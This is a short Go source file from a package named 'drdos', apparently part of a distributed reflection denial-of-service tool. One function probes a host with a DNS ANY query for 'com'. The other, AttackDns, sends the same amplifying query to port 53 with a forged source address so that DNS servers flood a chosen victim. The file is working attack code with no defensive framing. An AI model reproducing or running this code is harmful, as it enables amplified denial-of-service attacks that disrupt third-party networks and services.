package drdos

import (
	"drdos/config"
	"drdos/utils"
)

func CheckDns(dstip string, srcip string) error {
	payload := []byte{5, 245, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 3, 99, 111, 109, 0, 0, 255, 0, 1}
	dport := 0x35
	return utils.SendUdpPack(dstip, srcip, dport, config.ListenPort, payload)
}

func AttackDns(dstip string, srcip string, port int) error {
	payload := []byte{5, 245, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 3, 99, 111, 109, 0, 0, 255, 0, 1}
	dport := 0x35
	return utils.SendUdpPack(dstip, srcip, dport, port, payload)
}
